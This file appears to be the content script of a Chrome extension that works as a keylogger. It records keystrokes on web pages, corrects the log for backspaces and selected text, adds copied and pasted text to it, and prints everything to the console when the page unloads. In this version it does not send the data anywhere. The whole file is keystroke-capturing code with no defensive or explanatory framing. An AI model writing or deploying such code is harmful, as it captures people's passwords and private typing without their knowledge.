var site = null;
var keys = "";
var selectedText = null;
var copiedText = null;

const BACKSPACE = 8;
const ENTER = 13;

window.onbeforeunload = function() {
    console.log(keys);   
    keys = "";
}

chrome.runtime.onMessage.addListener(
    function(request) {
        site = request.site;
        console.log("site:" + site);
});


// var inputs = document.getElementsByTagName("input");

// for(var i = 0; i < inputs.length; i++) {
//     inputs[i].addEventListener("click", function(){
//         console.log("clicked name "+ this.name + ", text: " + this.getAttribute("data-initial-value"));
//         // console.log(chrome.tabs.get(0).url);
//      });
// }

document.onkeypress = function(event) {
    var keyCode = event.keyCode;
    var key = String.fromCharCode(keyCode)
    keys += key;
}

// Remove Backspaces from Log
document.onkeydown = function(event) {
    var key = event.keyCode || event.charCode;

    if (key == BACKSPACE) {
        if (selectedText != null && keys.indexOf(selectedText) != -1) {
            keys = keys.substring(0, keys.indexOf(selectedText)) + keys.substring(keys.indexOf(selectedText)+selectedText.length)
        } else {
            if (keys.length > 0) {
                keys = keys.slice(0, -1);
            }
        }
    }         
};

function detectSelectedText() {
    var text = "";
    if (typeof window.getSelection != "undefined") {
        text = window.getSelection().toString();
    } else if (typeof document.selection != "undefined" && document.selection.type == "Text") {
        text = document.selection.createRange().text;
    } else {
        text = null;
    }
    if (text == "") {
        text = null;
    }
    selectedText = text;
}

document.onmouseup = detectSelectedText;
document.onkeyup = detectSelectedText;

// Log Copy + Paste Text
document.addEventListener('copy', function(){
    copiedText = document.getSelection().toString();
});

document.addEventListener('paste', function(event){
    keys += copiedText;
});